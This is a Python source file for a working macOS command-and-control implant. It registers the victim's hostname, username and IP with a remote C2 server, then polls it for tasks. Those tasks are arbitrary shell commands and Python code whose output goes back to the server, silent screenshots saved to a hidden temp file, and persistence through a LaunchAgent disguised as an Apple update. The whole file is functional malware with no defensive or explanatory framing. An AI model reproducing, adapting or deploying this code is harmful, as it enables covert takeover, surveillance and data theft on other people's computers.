#!/usr/bin/env python3
"""C2 Agent — macOS edition with macOS-specific features."""

import os, sys, json, time, socket, platform, subprocess, uuid, threading
from urllib.request import Request, urlopen

C2_URL = os.environ.get("C2_URL", "http://CHANGE_ME:443")
AGENT_ID = os.environ.get("AGENT_ID", str(uuid.uuid4()))
SLEEP = int(os.environ.get("SLEEP", "5"))

def http_post(path, data):
    payload = json.dumps(data).encode()
    req = Request(f"{C2_URL}{path}", data=payload, headers={"Content-Type": "application/json"})
    return json.loads(urlopen(req, timeout=15).read())

def register():
    info = {
        "id": AGENT_ID,
        "hostname": socket.gethostname(),
        "username": os.popen("whoami").read().strip(),
        "os": f"macOS {platform.mac_ver()[0]}",
        "arch": platform.machine(),
        "ip_internal": socket.gethostbyname(socket.gethostname()),
        "platform_type": "machine"
    }
    return http_post("/api/agent/register", info)

def execute_task(task):
    task_type = task.get("task_type", "cmd")
    payload = task.get("payload", "")

    try:
        if task_type == "cmd":
            return subprocess.check_output(payload, shell=True, stderr=subprocess.STDOUT, timeout=300).decode(errors="replace")
        elif task_type == "python":
            old_stdout = sys.stdout
            sys.stdout = buf = __import__("io").StringIO()
            try:
                exec(payload, {"__builtins__": __builtins__})
                return buf.getvalue() or "executed"
            finally:
                sys.stdout = old_stdout
        elif task_type == "screenshot":
            subprocess.run(["screencapture", "-x", "/tmp/.screen.png"], timeout=10)
            return "Screenshot: /tmp/.screen.png"
        elif task_type == "persist":
            plist = os.path.expanduser("~/Library/LaunchAgents/com.apple.update.plist")
            script = os.path.abspath(__file__)
            content = f"""<?xml version="1.0"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
<key>Label</key><string>com.apple.update</string>
<key>ProgramArguments</key><array><string>python3</string><string>{script}</string></array>
<key>RunAtLoad</key><true/>
<key>KeepAlive</key><true/>
</dict></plist>"""
            os.makedirs(os.path.dirname(plist), exist_ok=True)
            with open(plist, "w") as f:
                f.write(content)
            os.system(f"launchctl load {plist} 2>/dev/null")
            return f"Persistence: {plist}"
        elif task_type == "kill":
            os.system("launchctl remove com.apple.update 2>/dev/null")
            http_post("/api/agent/result", {"task_id": task["id"], "result": "macOS agent terminated"})
            sys.exit(0)
        else:
            return subprocess.check_output(payload, shell=True, stderr=subprocess.STDOUT, timeout=300).decode(errors="replace")
    except Exception as e:
        return f"[error] {e}"

def beacon_loop():
    import random
    while True:
        try:
            resp = http_post("/api/agent/beacon", {"id": AGENT_ID})
            for task in resp.get("tasks", []):
                result = execute_task(task)
                if len(result) > 65000:
                    result = result[:65000] + "\n[...truncated]"
                http_post("/api/agent/result", {"task_id": task["id"], "result": result})
        except: pass
        time.sleep(SLEEP + random.uniform(-0.5, 0.5))

if __name__ == "__main__":
    while True:
        try:
            register()
            break
        except: time.sleep(10)
    beacon_loop()
